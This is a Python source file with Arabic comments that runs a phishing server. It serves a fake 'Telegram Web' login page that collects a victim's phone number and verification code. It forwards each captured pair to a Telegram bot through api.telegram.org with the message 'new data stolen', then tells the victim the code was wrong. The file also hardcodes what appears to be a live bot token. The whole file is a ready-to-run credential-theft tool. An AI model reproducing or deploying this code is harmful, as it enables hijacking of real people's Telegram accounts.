from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import urllib.parse
import requests

# ===== إعدادات البوت =====
BOT_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
CHAT_ID = "ضع_معرف_الدردشة_هنا"  # استبدل هذا بالرقم

# ===== دالة الإرسال إلى تيليجرام =====
def send_to_telegram(phone, code):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"✅ تم سرقة بيانات جديدة:\n📱 الهاتف: {phone}\n🔑 الرمز: {code}"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# ===== خادم الفيشينج =====
class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.end_headers()
            # صفحة HTML مزيفة (نفسها)
            html = '''<!DOCTYPE html>
<html>
<head><title>Telegram Login</title></head>
<body style="text-align:center;font-family:sans-serif;padding-top:50px;">
    <h2>Telegram Web</h2>
    <form action="/login" method="POST">
        <input type="text" name="phone" placeholder="رقم الهاتف" required><br><br>
        <input type="text" name="code" placeholder="رمز التحقق" required><br><br>
        <button type="submit">تسجيل الدخول</button>
    </form>
</body>
</html>'''
            self.wfile.write(html.encode('utf-8'))  # تم الترميز بشكل صحيح
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            data = urllib.parse.parse_qs(post_data)
            
            phone = data.get('phone', [''])[0]
            code = data.get('code', [''])[0]
            
            # إرسال البيانات إلى البوت
            send_to_telegram(phone, code)
            
            # رد للمستخدم (تم الترميز بشكل صحيح)
            self.send_response(200)
            self.end_headers()
            self.wfile.write("<h3>رمز غير صحيح، حاول مجدداً</h3>".encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return

# ===== تشغيل الخادم =====
def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), PhishingHandler)
    print(f"[*] خادم الفيشينج يعمل على المنفذ {port}")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
